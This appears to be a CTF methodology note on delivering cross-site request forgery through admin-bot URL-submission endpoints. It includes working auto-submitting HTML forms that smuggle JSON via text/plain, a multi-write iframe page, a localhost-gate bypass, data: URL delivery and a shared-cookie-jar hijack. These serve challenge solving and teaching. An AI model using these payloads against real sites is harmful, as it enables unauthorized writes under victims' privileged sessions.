# Bot delivery — the viewer does the write

In CTF the CSRF viewer is almost always a headless bot that visits
a URL you submit. The bot holds the privileged session — the write
fires under ITS ambient credentials, not yours.

---

## 1. The bot surface

```bash
# the endpoint that makes the bot visit
POST /report        {"url":"https://attacker/page"}
POST /visit         {"url":"..."}
POST /submit-url    {"url":"..."}
POST /check         {"url":"..."}
POST /preview       {"url":"..."}
POST /review        {"url":"..."}
POST /admin-bot     {"url":"..."}
POST /contact       {"url":"..."}     — disguised
POST /flag-report   {"url":"..."}
GET  /visit?url=...
GET  /report?url=...
```

White-box signals: `puppeteer`/`playwright`/`selenium`/`chromedriver`
/`headless` in the source or package.json.

## 2. The bot's credential shapes

| Bot shape | The ambient credential |
|---|---|
| session cookie (the bot logs in) | `session=...` — SameSite decides attach |
| localhost socket-peer | `remote_ip == 127.0.0.1` — the bot's own loopback |
| a shared cookie jar (SSOS) | a jar all visits share — persists across visits |
| an admin role (the bot IS admin) | its session token |
| a flag-in-context | the flag lives in the bot's session/cookie/page |

The bot's browser is the delivery vehicle — the CSRF page runs in
the BOT's context, reads nothing, but fires the write under the
bot's ambient authority.

## 3. The "bot is localhost" shape — the TornadoService card

```
attacker hosts:  https://attacker/page  (a form POSTing to
                                       http://127.0.0.1:1337/update)
bot visits:      https://attacker/page
bot's browser:   loads the page; the form POSTs to
                 http://127.0.0.1:1337/update  — from the BOT's
                 network context, 127.0.0.1 is the bot's own host
server sees:     a request from remote_ip=127.0.0.1 — the local
                 check passes — the write lands
```

The key: the bot's browser resolves `127.0.0.1` to the bot's OWN
host — a `remote_ip`/`localhost` gate that refuses YOUR request
accepts the bot's. The CSRF page never reaches your server; it
fires the write inside the bot's context.

## 4. The "shared cookie jar" shape — the SSOS card

```
the bot holds a persistent cookie jar across visits
1. attacker wins the registration race on the fixed bot account
   → the bot's own login fails, its token cookie is YOUR account's
2. the CSRF page does a text/plain JSON login to YOUR account —
   overwrites the shared token cookie via Set-Cookie
3. the bot's loginSSO step ignores credentials, uses the jar —
   now the jar holds YOUR session
4. the bot writes the flag into YOUR account's assignment
```

The jar persisting ACROSS bot cycles is the primitive — a cookie
set in one visit is still there for the next.

## 5. The page you host — the composite delivery

```html
<!doctype html><html><head>
<meta name="referrer" content="no-referrer">  <!-- strip referer -->
</head><body>
<form id="f" action="http://127.0.0.1:1337/update" method="POST" enctype="text/plain">
  <input name='{"machine_id":"host-x","ignore":"' value='"}'>
</form>
<script>
  document.getElementById('f').submit();
</script>
</body></html>
```

The ingredients:
- `<meta name="referrer" content="no-referrer">` — strips the
  Referer so an absent-referer gate (if any) opens
- `enctype="text/plain"` — no percent-encoding; the JSON body ships
- the `=` absorbed inside `"ignore":"` — the valid-JSON assembly
- auto-submit on load — one script line

## 6. The "the write must be reachable from the bot's context" check

The bot's browser runs in the CHALLENGE's network — `127.0.0.1`,
`localhost`, internal hostnames, the service's own name in a
docker-compose net (`http://app:8080/`, `http://web/`) — all
reachable from the bot, unreachable from you. Map the internal
hostname from source (`docker-compose.yml`, `nginx.conf`, the
report endpoint's own URL).

```bash
# the bot's reachable names
grep -rnoE '(127\.0\.0\.1|localhost|0\.0\.0\.0|http://[a-z_]+(:[0-9]+)?/|docker|compose|internal|service|app:|web:|backend:|api:)' \
  <src> --include='*.yml' --include='*.yaml' --include='*.conf' \
  --include='Dockerfile*' --include='*.js' --include='*.py' | head -40
```

## 7. The bot-cycle timing — the readback window

```text
bots run on a schedule — every N seconds/minutes, or on submit.
the confirmation is the state change the write created, not the
bot's HTTP answer. the poll pattern:
  1. submit the CSRF URL to the bot endpoint
  2. poll the oracle (the object you own, the state that changes)
     on an interval until the write's effect appears
```

The bot's visit is asynchronous — a `202`/`200` on the submit says
"queued", not "done". The poll reads the resulting state.

## 8. The one-shot constraint

```text
- bots may run once per submission — a failed payload costs a cycle
- the page must self-contain everything (no external scripts the
  bot's sandbox might block)
- a page that errors on load still fires the form if the submit is
  the FIRST script line — put the write before any decoration
- a bot that closes the page fast needs the write fired sync —
  form.submit() is synchronous-ish; a fetch may be cut off — the
  form-navigation is the reliable fire
```

## 9. The multi-step bot delivery — when the page must do two writes

```html
<!-- chain the writes inside one page — iframes for independence -->
<iframe name="w1" style="display:none"></iframe>
<iframe name="w2" style="display:none"></iframe>
<form target="w1" action="http://127.0.0.1/a" method="POST" enctype="text/plain">
  <input name='{"a":"' value='x","i":"'}'>
</form>
<form target="w2" action="http://127.0.0.1/b" method="POST" enctype="text/plain">
  <input name='{"b":"' value='y","i":"'}'>
</form>
<script>
  document.querySelectorAll('form').forEach(f=>f.submit());
</script>
```

Each form targets a hidden iframe — both fire without navigating
the top page away. Two writes in one bot cycle — attribute each to
a distinct marker.

## 10. The "the bot has no network to you" falsifier

```text
the bot runs airgapped/inside-only — it can reach 127.0.0.1 and the
challenge service but NOT your external host. then the CSRF page
itself can't be your external URL — it must be a data: URL, a
blob, or hosted ON the challenge (a stored XSS/stored-content page).
the SSOS card's shape: the URL submitted was a data:text/html URL —
the page content lives IN the submitted string, no external host.
```

`data:text/html,<page>` — the whole CSRF page encoded in the URL
you submit — the bot renders it without any external fetch.

## 11. The oracle — reading the bot's write

```bash
# the state change poll
curl -s "$BASE/api/object/<id>" | grep -o 'csrf-marker'
# or the endpoint's own list
curl -s "$BASE/stats" | grep -o 'ppmarker\|csrf-marker'
# or the OOB hit — if the page can still reach you
python3 tools/web/oob_listener.py hits
```

## 12. The falsifier

```text
no bot/report/visit endpoint exists, OR the bot can't reach the
write's host (airgapped), OR the write needs a content-type the
bot's form can't produce — the delivery fails; pivot to a stored-
CSRF or a different class.
```

## 13. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "bot-delivery: /report bot -> 127.0.0.1 write via text/plain form"
```
